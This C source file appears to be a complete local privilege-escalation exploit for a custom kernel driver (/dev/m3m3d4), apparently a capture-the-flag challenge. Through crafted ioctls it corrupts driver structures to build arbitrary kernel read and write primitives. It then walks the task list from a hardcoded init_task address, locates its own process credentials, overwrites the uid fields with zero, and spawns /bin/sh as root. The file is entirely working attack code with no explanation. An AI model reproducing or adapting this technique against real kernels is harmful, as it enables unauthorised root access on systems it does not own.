#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

#define MEME_LIST 1337 + 0
#define MEME_REFRESH 1337 + 1
#define MEME_UPDATE 1337 + 2
#define MEME_QCRED 1337 + 3
#define MEME_QCOMM 1337 + 4
#define MEME_QSCRIPT 1337 + 5
#define MEME_UPDATE_SCRIPT 1337 + 6

#define NEXT 0x268
#define COMM 0x3bc
#define CRED 0x3b8

struct qcred_t {
	int pid;
	void *buf;
};

struct qcomm_t {
	int pid;
	void *buf;
};

struct qscript_t {
	int pid;
	void *buf;
};

struct qupdate_script_t {
	int pid;
	size_t size;
	void *buf;
};

unsigned int read32(unsigned int addr, int fd, int j, int k)
{
	struct qupdate_script_t qup;
	int ret;
	unsigned int value;

	qup.pid = j;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	*(unsigned int *)(qup.buf) = k;
	*(unsigned int *)(qup.buf + 0x4) = addr;
	*(unsigned int *)(qup.buf + 0x8) = addr;
	*(unsigned int *)(qup.buf + 0xc) = addr;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);

	char *answer = malloc(0x100);

	struct qcred_t qq;
	qq.pid = k;
	qq.buf = answer;
	ret = ioctl(fd, MEME_QCRED, &qq);

	value = *(unsigned int *)answer;

	free(qup.buf);
	free(answer);

	return value;
}

void write128(unsigned int addr, int fd, int j, int k)
{
	struct qupdate_script_t qup;
	int ret;
	unsigned int value;

	qup.pid = j;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	*(unsigned int *)(qup.buf) = k;
	*(unsigned int *)(qup.buf + 0x4) = addr;
	*(unsigned int *)(qup.buf + 0x8) = addr;
	*(unsigned int *)(qup.buf + 0xc) = addr;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);

	qup.pid = k;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	memset(qup.buf, 0, 0x10);
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);
}

char *args[] = { "/bin/sh", 0 };

int main()
{
	int fd, ret;
	int i;
	
	int pid[1000];	
	int count;

	void *addr = mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

//	system("for i in `seq 64`; do ./hello & done");

	fd = open("/dev/m3m3d4", O_RDONLY);
	printf("%d\n", fd);	

	ret = ioctl(fd, MEME_LIST, addr);

	count = *(int *)addr;

	for (i = 0; i < count; i++)
	{
		pid[i] = *(unsigned int *)(addr + 4 + i * 4);
		printf("%d\n", pid[i]);
	}

	system("killall hello");

	printf("wait\n");
	getchar();

	for (i = 0; i < count; i++)
	{
		ret = ioctl(fd, MEME_UPDATE, pid[i]);
	}

	printf("update done\n");

	struct qupdate_script_t qu[0x10];

	for (i = 0; i < 0x10; i++)
	{
		qu[i].pid = pid[i];
		qu[i].size = 0x10;
		qu[i].buf = malloc(0x10);
		memset(qu[i].buf, i, 0x10);
		ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qu[i]);
	}

	ret = ioctl(fd, MEME_LIST, addr);

	for (i = 0; i < *(unsigned int *)addr; i++)
	{
		printf("0x%08x\n", *(unsigned int *)(addr + 4 + i * 4));
	}

	int j, k;
	//int jj, kk;
	scanf("%d %d", &j, &k);
	//scanf("%d %d", &jj, &kk);
/*
	struct qupdate_script_t qup;
	qup.pid = j;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	memset(qup.buf, 0x41, 0x10);
	*(unsigned int *)(qup.buf) = k;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);
*/

	unsigned int init_task = 0xc19c6280;
	unsigned int current = init_task;
	unsigned int comm;

	while(1)
	{
		comm = read32(current + COMM, fd, j, k);
		if (comm == 0x00707865)
			break;
		
		current = read32(current + NEXT, fd, j, k) - NEXT;
	}

	printf("leak: 0x%08x\n", current);

	unsigned int cred = read32(current + CRED, fd, j, k);
	printf("cred: 0x%08x\n", cred); 

	struct qupdate_script_t qup;

	qup.pid = j;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	*(unsigned int *)(qup.buf) = k;
	*(unsigned int *)(qup.buf + 0x4) = 0x41414141;
	*(unsigned int *)(qup.buf + 0x8) = 0x41414141;
	*(unsigned int *)(qup.buf + 0xc) = 0x0;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);
	
	qup.pid = k;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	*(unsigned int *)(qup.buf) = 32;
	*(unsigned int *)(qup.buf + 0x4) = cred + 0x4;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);

	struct qscript_t qs;
	qs.pid = j;
	qs.buf = addr;

	ioctl(fd, MEME_QSCRIPT, &qs);
	
	unsigned int m_script = *(unsigned int *)(qs.buf + 0x10);
	printf("m_script: 0x%08x\n", m_script);
	
	unsigned int m_size = read32(m_script, fd, j, k);
	unsigned int m_content = read32(m_script + 0x4, fd, j, k);
	printf("size: %d m_content: 0x%08x\n", m_size, m_content);
	//write128(cred + 0x4, fd, j, k);
	//write128(cred + 0x4 + 0x10, fd, j, k);

	qup.pid = j;
	qup.size = 0x10;
	qup.buf = malloc(0x10);
	*(unsigned int *)(qup.buf) = k;
	*(unsigned int *)(qup.buf + 0x4) = 0x41414141;
	*(unsigned int *)(qup.buf + 0x8) = 0x41414141;
	*(unsigned int *)(qup.buf + 0xc) = m_content;
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);

	qup.pid = k;
	qup.size = 32;
	qup.buf = malloc(32);
	memset(qup.buf, 0, 32);
	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qup);

	setuid(0);
	
	printf("uid: %d\n", getuid());	

	execve(args[0], args, 0);
		
/*
	struct qcred_t qcred;
	qcred.pid = 543;
	qcred.buf = addr;

	ret = ioctl(fd, MEME_QCRED, &qcred);
	for (i = 0; i < 0x10; i++)
	{
		printf("%d\n", *(unsigned int *)(addr + i * 4));
	}

	struct qcomm_t qcomm;
	qcomm.pid = 543;
	qcomm.buf = addr;

	ret = ioctl(fd, MEME_QCOMM, &qcomm);
	printf("%s\n", (char *)addr);

	struct qupdate_script_t qu;
	qu.pid = 543;
	qu.size = 0x10;
	qu.buf = malloc(0x10);
	memset(qu.buf, 0x41, 0x10);

	ret = ioctl(fd, MEME_UPDATE_SCRIPT, &qu);

	struct qscript_t qs;
	qs.pid = 543;
	qs.buf = addr;

	ioctl(fd, MEME_QSCRIPT, &qs);

	printf("%d\n", *(unsigned int *)addr);	
	for( i = 0; i < 0x10; i++)
	{
		printf("%c", *(char *)(addr + i + 4));
	}

	ioctl(fd, MEME_REFRESH, 0);
*/
	return 0;
}
